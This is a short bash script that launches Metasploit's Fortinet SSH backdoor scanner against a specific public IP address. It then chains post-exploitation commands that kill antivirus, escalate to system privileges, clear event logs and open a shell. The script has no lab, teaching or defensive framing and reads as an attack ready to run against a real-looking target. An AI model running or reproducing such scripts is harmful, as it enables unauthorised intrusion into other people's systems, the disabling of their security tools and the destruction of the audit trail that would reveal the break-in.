#!/bin/bash
msfconsole -x "use auxiliary/scanner/ssh/fortinet_backdoor;
set RHOSTS 177.67.249.70;
set RPORT 22;
set THREADS 3;
set SSH_DEBUG true;
set ShowProgressPercent 1;
set VERBOSE true;
run;
run killav;
getsystem;
clearev;
getuid;
shell"
